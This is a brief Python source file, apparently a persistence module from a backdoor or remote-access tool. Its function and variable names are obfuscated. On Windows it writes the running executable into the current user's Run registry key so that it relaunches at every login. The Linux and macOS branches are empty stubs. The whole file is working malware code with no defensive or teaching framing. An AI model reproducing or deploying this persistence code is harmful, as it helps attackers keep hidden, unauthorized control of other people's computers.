# -*- coding: utf-8 -*-
import sys
def bkJZOPiTyZrokxuLJwULUTWqcREHocPK():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    fAhjXlZntcdBgtUtJZZYfWcsIbPepNnn = r'Software\Microsoft\Windows\CurrentVersion\Run'
    HyICVZRNOvSRqfjkJMWFNkgybJgDSiBP = sys.executable
    try:
        HxEHVcPndUotCgDciXrGcWFZjPmJxwls = _winreg.OpenKey(HKCU, fAhjXlZntcdBgtUtJZZYfWcsIbPepNnn, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(HxEHVcPndUotCgDciXrGcWFZjPmJxwls, 'br', 0, _winreg.REG_SZ, HyICVZRNOvSRqfjkJMWFNkgybJgDSiBP)
        _winreg.CloseKey(HxEHVcPndUotCgDciXrGcWFZjPmJxwls)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'
def cCCWtCtQqcaeTYFAhQAwprZZeNhAABiq():
    return False, 'nothing here yet'
def QxmtqZmVKvLtZxxoblCvgSfuzKIFdZKC():
    return False, 'nothing here yet'
def riZaDmNOsluzUlWxKfMZLiUcvOhUrTuc(plat_type):
    if plat_type.startswith('win'):
        GBCeDRFXbELeGscLkjkDyZWvXkXMTumY, gsMSzDfLZZrZrjKiSSCfZWTtlzxcoCmX = bkJZOPiTyZrokxuLJwULUTWqcREHocPK()
    elif plat_type.startswith('linux'):
        GBCeDRFXbELeGscLkjkDyZWvXkXMTumY, gsMSzDfLZZrZrjKiSSCfZWTtlzxcoCmX = cCCWtCtQqcaeTYFAhQAwprZZeNhAABiq()
    elif plat_type.startswith('darwin'):
        GBCeDRFXbELeGscLkjkDyZWvXkXMTumY, gsMSzDfLZZrZrjKiSSCfZWTtlzxcoCmX = QxmtqZmVKvLtZxxoblCvgSfuzKIFdZKC()
    else:
        return 'Error, platform unsupported.'
    if GBCeDRFXbELeGscLkjkDyZWvXkXMTumY:
        IKrJWSUPXzCeStfSjMGWSKcbkCNLtGGl = 'Persistence successful, {}.'.format(gsMSzDfLZZrZrjKiSSCfZWTtlzxcoCmX)
    else:
        IKrJWSUPXzCeStfSjMGWSKcbkCNLtGGl = 'Persistence unsuccessful, {}.'.format(gsMSzDfLZZrZrjKiSSCfZWTtlzxcoCmX)
    return IKrJWSUPXzCeStfSjMGWSKcbkCNLtGGl
